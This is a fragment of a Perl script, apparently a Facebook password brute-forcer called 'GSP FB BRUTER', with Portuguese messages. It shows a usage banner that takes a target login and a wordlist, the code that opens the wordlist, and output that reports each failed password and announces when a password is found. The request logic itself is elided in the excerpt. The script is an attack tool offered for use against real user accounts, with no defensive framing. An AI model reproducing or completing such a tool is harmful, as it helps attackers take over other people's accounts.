...
system('clear & cls');
print "\n+++ GSP FB BRUTER\n";
print "+++ CODADO POR GSP\n";
print "+++ COMO USAR ====> perl $0 LOGIN WORDLIST.TXT\n\n";
exit; }

my $user = $ARGV[0];
my $wordlist = $ARGV[1];

open (LIST, $wordlist) || die "\n[-] CADE A WORDLIST!? $wordlist -_- \n";
...
if (!defined $success)
{
print "[-] $password -> NÃO CONSEGUIMOS ;-; \n";
close SSL;
}
else
{
print "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
print "[+] ENCONTRAMOS A SENHA!! => $password \n";
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n";
close SSL;
exit;
}
